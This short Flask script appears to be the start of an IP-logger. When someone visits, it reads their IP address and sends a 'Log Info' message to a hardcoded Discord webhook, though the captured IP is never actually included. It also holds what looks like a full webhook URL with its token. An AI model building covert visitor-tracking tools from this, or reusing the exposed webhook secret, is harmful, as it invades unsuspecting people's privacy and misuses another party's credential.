from flask import Flask, request
import requests
import os

app = Flask(__name__)

DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1369953205349519380/zAmptjF_CZ3l5xyJ12DOIf3GWQatSNJKepjL_d7r3FL5-QxXhh_msIOjXj4WMEECZjxz'
PUBLIC_URL = os.getenv("PUBLIC_URL")

@app.route('/')
def index():
    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    data = {
        "content": "Log Info",
        "embeds": [
            {
                "image": {"url": PUBLIC_URL}
            }
        ]
    }
    requests.post(DISCORD_WEBHOOK_URL, json=data)
    return '', 204

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)

